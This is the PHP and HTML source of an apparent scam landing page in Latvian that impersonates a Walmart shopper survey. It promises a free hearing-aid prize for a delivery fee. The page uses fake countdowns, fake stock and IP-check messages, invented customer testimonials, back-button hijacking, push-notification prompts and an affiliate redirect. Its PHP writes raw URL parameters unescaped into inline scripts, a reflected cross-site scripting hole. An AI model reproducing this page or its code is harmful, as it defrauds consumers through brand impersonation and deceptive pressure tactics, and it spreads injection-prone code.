<!DOCTYPE html>

<?php
// w4 logo

$page_peel_brand = "";
  if ($_GET['s'] == "1016") {
$page_peel_brand = <<<page_peel_brand
<script type="text/javascript" src="/utils/banners/banner-brnd.js"></script>
<style>
img.banner {
    position: fixed;
    top: 0;
    width: 150px;
    z-index: 999999999999;
}
</style>
page_peel_brand;
  }
// This is index-rp-nl-nw-exc.php - No Logo - New Window - Exclude by EPV
session_start();
require_once dirname(__FILE__) . "/../wall/nas-functions.php";
if(isset($_GET['nasTag']) && !empty($_GET['nasTag'])) {
  $tag = $_GET['nasTag'];
} else {
  $tag = "";
}

$data = GetNasWall("wadasd", null, $tag)[0];

require_once(dirname(__FILE__) . "/../helpers.php");
if (getcwd() === "/var/surveys/redzun") {
    include("_php_voluum_clock_or_lptoken_check-w14.php");
} else {
    include(dirname(__FILE__) . "/../_php_voluum_clock_or_lptoken_check-w14.php");
}

if (isset($_GET['cc'])) $country = strtolower($_GET['cc']); // country must be defined for include
  else $country = 'us';

$_SESSION['cc'] = $country; // Set Country ID

if (isset($_GET['wid'])) $wid = strtolower($_GET['wid']); // Wall ID
  else $wid = 'default';

$_SESSION['wid'] = $_GET['wid']; // Set Wall ID

$offer_parameters = "?c=" . $_GET['c']."&k="."&v=".$_GET['v']."&s=".$_GET['s']."&t=".$_GET['t']."&cr=".$_GET['cr']."&src=".$_GET['src']."&lp=".$_GET['lp']."&id=".$_GET['id'];
$offer_url = "https://" . $offer_link_domain_fold . "/de7d783b-d901-4973-8080-b75e3e249c7c". $offer_parameters;

?>
<script>
  function r(b,a){return++a?String.fromCharCode((b<"["?91:123)>(b=b.charCodeAt()+13)?b:b-26):b.replace(/[a-zA-Z]/g,r)}
  pr_name = "<?php echo str_rot13(""); ?>";


</script>

<script>
 			window.c_var = '<?=!empty($_GET['c']) ? $_GET['c'] : ""?>';
			window.k_var = '<?=!empty($_GET['k']) ? str_rot13($_GET['k']) : ""?>';
			window.s_var = '<?=!empty($_GET['s']) ? $_GET['s'] : ""?>';
			window.src_var = '<?=!empty($_GET['src']) ? $_GET['src'] : ""?>';
			window.id_var = '<?=!empty($_GET['id']) ? $_GET['id'] : ""?>';
			
			var jumpurl;
      jumpurl = '<?php echo $data->url ?>';
 </script>

<html lang="lv">
    <head>
        <base href="/lv-asdasd/">
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Aptaujas balvas</title>
        <link rel="stylesheet" href="./files/style.css?v=14">
        <link rel="stylesheet" href="./files/animate.min.css">
        <link rel="icon" href="./files/wal_favicon.png">
        <script defer src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" integrity="sha384-rOA1PnstxnOBLzCLMcre8ybwbTmemjzdNlILg8O7z1lUkLXozs4DHonlDtnE7fpc" crossorigin="anonymous"></script>
        <script src="./files/datehead.js"></script>

        <style>
            .con-body button{
                font-size: 18px;
                font-weight: 600;
                background-color: #0071CE;
                color: #fff;
                text-align: center;
                padding: .6rem;
                margin-bottom: .5rem;
                width: 80%;
                border: 1px solid #0071CE;
                border-radius: 3px;
                cursor: pointer;
                transition: transform .5s;
            }

            .con-body button:hover{
                background-color: #0071CE;
            }

            .con-head-ln1 {
                background-color: #0071CE;
                color: #fff;
            }

            .con-body {
                margin: 10px;
                /* background-image: url('./banner.jpg');
                    background-size: cover; */
                background-color: #fff;
                padding: 15px;
                border-bottom: 10px solid #0071CE;
                border-radius: 3px;
                box-shadow: 0px 0px 2px 2px #d1d1d1;
            }

            .inn-q-verif-content-title b {
                color: #0071CE !important;
            }

            .con-body-ln3 b {
                color: #0071CE;
            }

            .con-prize .prize-ln2-title {
                color: #222;
                padding-left: 15px !important;
            }

            .con-prize .con-prize-button {
                font-size: 18px;
                font-weight: 600;
                background-color: #0071CE;
                color: #fff;
                text-align: center;
                padding: 0.6rem;
                margin: 10px -10px 0px 10px;
                width: 80%;
                border: 1px solid #0071CE;
                border-radius: 3px;
                cursor: pointer;
                transition: transform 0.5s;
            }

            .con-prize .con-prize-button:hover {
                background-color: #0071CE;
                cursor: pointer;
                transform: scale(1.1);
            }

            .comm-title button {
                font-size: 15px;
                padding: 7px 15px;
                margin-left: 5px;
                border: 0px;
                background-color: #0071CE;
                color: #fff;
                border-radius: 3px;
                cursor: pointer;
            }

            .con-footer {
                margin: 10px;
                background-color: #fff;
                padding: 15px;
                border-top: 10px solid #ffc220;
                border-radius: 3px;
                box-shadow: 0px 0px 2px 2px #d1d1d1;
            }

            .con-bottom-bar {
                text-align: center !important;
                background-color: #ffc220;
                position: fixed;
                bottom: 0;
                left: 0;
                z-index: 99;
                width: 100%;
                border-top: 2px solid #ffc220;
                padding-top: 3px;
                padding-bottom: 3px;
                box-shadow: 11px 0px 24px 0 rgba(0, 0, 0, 0.3);
            }

            .modal-foot button {
                font-size: 20px;
                padding: 0.5rem 1rem;
                font-weight: 600;
                background-color: #0071CE;
                color: #fff;
                border: 1px solid #fff;
                border-radius: 3px;
                cursor: pointer;
            }

            .modal-foot {
                background-color: #ffc220;
            }

            .con-head-ln2 {
                background-color: #fff;
                color: #000;
                text-align: center;
            }

            body {
                padding: 0px;
                margin: 0px;
                background-color: #e2e2e2;
                font-family: sans-serif;
                font-size: 14px;
                background-image: url('./files/wal_bg.png');
                background-attachment: fixed;
                background-position: center;
                background-repeat: repeat-y;
                background-size: cover;
            }

            .btn-close {
                background-color: #fff;
            }
        </style>
    </head>
    <body>
        <div class="con-full">
            <div class="con-head">
                <div class="con-head-ln1">
                    <h4></h4>
                </div>
                <div class="con-head-ln2">
                    <div class="con-head-line">
                        <hr/>
                        <span>Aptauja par</span> 
                        <hr/>
                    </div>
                    <img src="./files/wal_logo.png" style="max-width: 200px; height: auto; margin-top: 10px;" alt="">
                    <h3><script>document.write(datehax("Janvāris, Februāris, Marts, Aprīlis, Maijs, Jūnijs, Jūlijs, Augusts, Septembris, Oktobris, Novembris, Decembris", "lv"));</script><img class="imgflg" src="./files/flaglogo.png" alt=""></h3>
                </div>
            </div>
            <div class="con-body-pad">
                <div class="con-body" id="content-changeCol">
                    <div class="con-body-ln1">
                        <div class="con-body-ln1-inn1">
                            <img src="./files/197605 (1).png" id="product-img" alt="">
                        </div>
                        <div class="con-body-ln1-inn2">
                            <p>
                                <b></b><br/><br/>Mēs vēlamies piedāvāt Jums unikālu iespēju saņemt pavisam jaunu <b>asd!</b>
                                Lai to pieprasītu, vienkārši aizpildiet īsu aptauju par Jūsu pieredzi ar Walmart.
                            </p>
                            <br/>
                            <p>
                                <b><span>Uzmanību!</span></span> Šis aptaujas piedāvājums beidzas šodien, <script>document.write(datehax("Janvāris, Februāris, Marts, Aprīlis, Maijs, Jūnijs, Jūlijs, Augusts, Septembris, Oktobris, Novembris, Decembris", "lv"));</script>.</b>
                            </p>
                        </div>
                    </div>
                    <div class="con-body-question">
                        <div class="con-body-ln2">
                            <div class="inn-question">
                                <button class="inn-q-select" id="animate_btn_0" value="1">SĀKT APTAUJU</button>
                            </div>
                        </div>
                        <div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">1. jautājums no 8</small><br/>
        <b class="qeus-text">Cik bieži apmeklējat Walmart iepirkumiem?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Vairākas reizes nedēļā</button>
        <button class="inn-q-select qeus-text">Reizi nedēļā</button>
        <button class="inn-q-select qeus-text">Dažreiz mēnesī</button>
        <button class="inn-q-select qeus-text">Reti vai nekad</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">2. jautājums no 8</small><br/>
        <b class="qeus-text">Kas galvenokārt motivē Jūsu izvēli iepirkties Walmart?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Ērta atrašanās vieta</button>
        <button class="inn-q-select qeus-text">Preču klāsts</button>
        <button class="inn-q-select qeus-text">Cenas un piedāvājumi</button>
        <button class="inn-q-select qeus-text">Lojalitātes programma</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">3. jautājums no 8</small><br/>
        <b class="qeus-text">Redzot Walmart reklāmas, kā parasti reaģējat?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Meklēju nepieciešamās preces</button>
        <button class="inn-q-select qeus-text">Pārlūkoju, ja ir labs piedāvājums</button>
        <button class="inn-q-select qeus-text">Domāju par apmeklējumu, ja ir akcija</button>
        <button class="inn-q-select qeus-text">Parasti ignorēju reklāmas</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">4. jautājums no 8</small><br/>
        <b class="qeus-text">Ja Jūs laimētu dzirdes aparātu komplektu no Walmart, kā tas mainītu Jūsu viedokli par Walmart?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Ievērojami pozitīvāk</button>
        <button class="inn-q-select qeus-text">Nedaudz pozitīvāk</button>
        <button class="inn-q-select qeus-text">Nav pārmaiņu</button>
        <button class="inn-q-select qeus-text">Negativāk</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">5. jautājums no 8</small><br/>
        <b class="qeus-text">Kas dzirdes aparātu komplektā visvairāk piesaista Jūsu uzmanību?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Izturība</button>
        <button class="inn-q-select qeus-text">Komforts</button>
        <button class="inn-q-select qeus-text">Mobilitāte</button>
        <button class="inn-q-select qeus-text">Dizains un izskats</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">6. jautājums no 8</small><br/>
        <b class="qeus-text">Cik liela iespējamība Jums ir izmantot dzirdes aparātu komplektu, ja to saņemtu no Walmart?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Ļoti liela</button>
        <button class="inn-q-select qeus-text">Nedaudz liela</button>
        <button class="inn-q-select qeus-text">Neliela</button>
        <button class="inn-q-select qeus-text">To neizmantotu</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">7. jautājums no 8</small><br/>
        <b class="qeus-text">Kopumā, cik labi, Jūsu ieskatā, Walmart apmierina Jūsu vajadzības attiecībā uz preču klāstu?</b>
    </h2>
    <div class="inn-question">
        <button class="inn-q-select qeus-text">Pārspēj manas vajadzības</button>
        <button class="inn-q-select qeus-text">Ļoti labi apmierina manas vajadzības</button>
        <button class="inn-q-select qeus-text">Pietiekami apmierina manas vajadzības</button>
        <button class="inn-q-select qeus-text">Neapmierina manas vajadzības</button>
    </div>
</div>
<div class="inn-q animate__animated">
    <h2>
        <span class="qeus-head">Walmart pircēju pieredzes aptauja</span><br/><br/>
        <small class="qeus-numb">8. jautājums no 8</small><br/>
        <b class="qeus-text">Cik liela iespējamība Jums ir piedalīties turpmākajos Walmart piedāvājumos vai aptaujās?</b>
    </h2>
    <div class="inn-question" id="inn-last-q-item">
        <button class="inn-q-select qeus-text">Ļoti liela</button>
        <button class="inn-q-select qeus-text">Nedaudz liela</button>
        <button class="inn-q-select qeus-text">Ne pārāk liela</button>
        <button class="inn-q-select qeus-text">Nemaz neliela</button>
    </div>
</div>

                        <div class="inn-q-verif-content hidden" id="verif-content">
                            <h2 class="inn-q-verif-content-title"><b>Lūdzu, pagaidiet, kamēr apstrādājam Jūsu atbildes...</b></h2>
                            <h2 id="inn-q-progress-state1">Atbilžu iesniegšana...</h2>
                            <h2 id="inn-q-progress-state2" class="hidden">Pārbaude dublēto IP adrešu dēļ...</h2>
                            <h2 id="inn-q-progress-state3" class="hidden">Pārbaude mūsu inventāra pieejamības dēļ...</h2>
                            <h2 id="inn-q-progress-state4" class="hidden">Sirsnīgs paldies...</h2>
                            <img id="inn-q-progress-loading" src="./files/loadingBL.gif" alt="">
                            <h2 id="inn-q-progress-dones2" class="hidden">Atbildes iesniegtas</h2>
                            <h2 id="inn-q-progress-dones3" class="hidden">IP adrese pārbaudīta</h2>
                            <h2 id="inn-q-progress-dones4" class="hidden">Preces pieejamas noliktavā</h2>
                        </div>


                        <div class="con-body-ln3 hidden" id="prize-content-1">
                            <h2><b>Paldies par aptaujas aizpildīšanu!</b></h2>
                            <p>Tā kā Jūs palīdzējāt nodrošināt ārkārtīgi vērtīgus patērētāju datus, tagad Jūs varat izvēlēties dažas no zemāk esošajām ekskluzīvām balvām.</p>
                            <p>Lūdzu, ņemiet vērā, ka, ja pametīsiet šo lapu, neprasa balvu, mums nav citas izvēles, kā dot iespēju piedalīties balvu programmā citam apmeklētājam.</p>
                            <div class="body-ln3-carret animate__animated animate__slower animate__infinite animate__shakeY"><b><i class="fas fa-angle-double-down fa-2x"></i></b></i></div>
                        </div>
                    </div>
                </div>

                <div id="prize-content-2" class="hidden">
                    <div class="con-prize">
                        <div class="con-prize-outter">
                            <div class="con-prize-ln1">
                                <img src="./files/197605 (1).png" alt="">
                            </div>
                            <div class="con-prize-ln2">
                                <h2 class="prize-ln2-title" id="prize-ln2-desc">
                                    asd
                                </h2>
                                <p class="prize-ln2-desc">
                                    awdasd           
                                </p>
                                <div class="prize-ln2-amount">
                                    <div class="prize-ln2-zero1">&nbsp;Cena: <del>$asdsad</del></div>
                                    <div class="prize-ln2-zero2 animate__animated animate__heartBeat animate__slower animate__infinite">$0.00</div>
                                </div>
                                <p class="prize-ln2-stock">&nbsp;Atlikusī krājumā: <b>(<span class="animate__animated animate__flash animate__slower animate__infinite"> 2 </span>)</b></p>
                                <p class="prize-ln2-pfs">&nbsp;Maksājiet tikai par piegādi!</p>
                                <div class="prize-ln2-btn">
                                    <button id="btn-claim" class="con-prize-button"><i class="fas fa-shopping-cart"></i> PIEPRASĪT BALVU</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="con-nothing" id="nothing-id"></div>
            
                <!-- ALL COMMENTS ARE LISTE HERE -->
                <div id="comments" class="con-comment hidden">
                    <div class="com_cont">

                        <div class="comm-div">
                            <div class="comm-desc">
                                <div class="comm-name">Jauns komentārs</div>
                                <div class="comm-box">
                                   <textarea name="comment_box" rows="5"></textarea>
                                </div>
                                <div class="comm-title">
                                    <span><i class="fas fa-comments"></i> Komentāri (5)</span>
                                    <span><button><i class="fas fa-camera"></i></button><button>Nosūtīt</button></span>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/1.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Elīna Bērziņa</div>
                                <div class="comm-text">
                                    Es šo saņēmu pa e-pastu un nolēmu izmēģināt. Esmu sajūsmā par iespēju saņemt balvu! Vai es varu arī nosūtīt aptauju saviem draugiem?
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div>
                                        <div><i class="fas fa-thumbs-up"></i><span>52</span></div>
                                    </div>
                                    <div>
                                        <a href="#">Patīk</a>
                                        <a href="#">Atbilde</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/2.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Jānis Kalniņš</div>
                                <div class="comm-text">
                                    Faktiski ieguvu balvu no šīs aptaujas! Sākumā es biju skeptisks, bet tomēr izmēģināju. Un paskaties, kas tikko ieradās pa pastu!<br/>
                                    <img src="./files/download.png" alt="">
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>84</span></div>
                                    </div>
                                    <div>
                                        <a href="#">Patīk</a>
                                        <a href="#">Atbilde</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/3.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Laura Ozoliņa</div>
                                <div class="comm-text">
                                    Smieklīga aptauja, bet žēl, ka nesanāca balva.. 
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>12</span></div>
                                    </div>
                                    <div>
                                        <a href="#">Patīk</a>
                                        <a href="#">Atbilde</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/4.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Mārtiņš Liepiņš</div>
                                <div class="comm-text">
                                    Parasti es neaizpildīju šāda veida tiešsaistes aptaujas, bet šī ir tiešām laba!! Mēs šo balvu izmantosim ar labu nodomu, liels paldies!<br/>
                                    <img src="./files/feature.png" alt="">
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>97</span></div>
                                    </div>
                                    <div>
                                        <a href="#">Patīk</a>
                                        <a href="#">Atbilde</a>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="comm-div">
                            <div class="comm-image">
                                <img src="./files/5.jpg" alt="">
                            </div>
                            <div class="comm-desc">
                                <div class="comm-name">Dace Kļaviņa</div>
                                <div class="comm-text">
                                    Kur varu atrast vairāk šādu aptauju? Man patīk saņemt balvas :)
                                </div>
                                <div class="comm-footer">
                                    <div class="comm-footer-datelike">
                                        <div><i class="fas fa-calendar-alt"></i><span><script>document.write(datenhax());</script></span></div> 
                                        <div><i class="fas fa-thumbs-up"></i><span>16</span></div>
                                    </div>
                                    <div>
                                        <a href="#">Patīk</a>
                                        <a href="#">Atbilde</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="con-footer" id="con-footer">
                    <div class="footer-content">
                        <br /><br />
                        <img src="./files/f_guarantee.png" alt="guarantee" height="70px" width="auto" /> <img src="./files/f_secure_1.png"
                            alt="secureSiteLogo" height="75px" width="auto" />
                        <p class="copyright">Copyright © <script>document.write(datenhay());</script></p>
                        <div class="claim">
                            <span></span><br/><br/>
                            *Pēdējā lapā piedāvātajām precēm nepieciešami piegādes un apstrādes maksājumi. Detalizētu informāciju skatiet ražotāja vietnē, jo noteikumi dažādos piedāvājumos atšķiras. Skatiet svarīgos nosacījumus attiecībā uz šo aptauju, vietni un reklāmu.
                            <br/>*Svarīgi: Iespējami piegādes izmaksas.<br>
                            <br/><br/><br/>
                        </div>
                    </div>
                </div>

            </div>
        </div>

        <div class="con-bottom-bar">
           <div class="offer_expires">Piedāvājums beidzas <span id="time"></span></div>     
        </div>

        <div class="mod-con mod-con-bg hidden" id="modal-prize">
            <div class="modal mod-con-inn">
                <div class="btn-close">
                    <img src="./files/wal_logo.png" height="50px" alt="">
                    <!-- <h2>Tractor Supply</h2> -->
                    <button id="btn-close" ><!-- <i  class="fas fa-times fa-lg"></i> --></button>
                </div>
                <hr>
                <div class="modal-head">
                    <p><span>Sirsnīgi apsveicam!</span> Mēs esam rezervējuši (1) asd ekskluzīvi Jums.</p>
                </div>
                <div class="modal-body">
                    <p><span>Kā saņemt savu asd:</p>
                    <ol>
                        <li>Aizpildiet savu piegādes adresi.</li>
                        <li>Saņemiet savu balvu, maksājot tikai par piegādi.</li>
                        <li>Jūsu balva tiks piegādāta 5-7 darba dienu laikā.</li>
                    </ol>
                </div>
                <div class="modal-foot">
                    <img src="<?php echo $data->impression_url ?>" style="display:none;"></img>
                    <button id="button1">Turpināt</button>
                </div>
            </div>
        </div>
    </body>
    <script src="./files/script.js?v=29"></script>

    <script>
        document.getElementById('button1').addEventListener("click",function(){
            var urlParams = new URLSearchParams(window.location.search);
            
            window.location.href = jumpurl ;
        },false);
    </script>

    <?php
            if (($_GET['nopush'] !== "1") && ($_GET['src'] !== "TV"))
            {
                $aff_id = "2";
                if (!empty($_GET["s"])) {
                    $aff_id = $_GET["s"];
                }
                
                $trk_urls = [
                    "https://" . $_GET["trk"] . "/click/20"
                ];
                
                echo getPushCode("us", $aff_id, $trk_urls);
            }
            ?>
            
            <?php
            $backbutton_url = "https://" . $_SERVER['HTTP_HOST'] . "/back-w14.php?c=" . $_GET['c'] . "&k=" . $_GET['k'] . "&id=" . $_GET['id'] . "&source=" . $_GET['source'];
            
            echo getBackButton($backbutton_url);
    ?>
</html>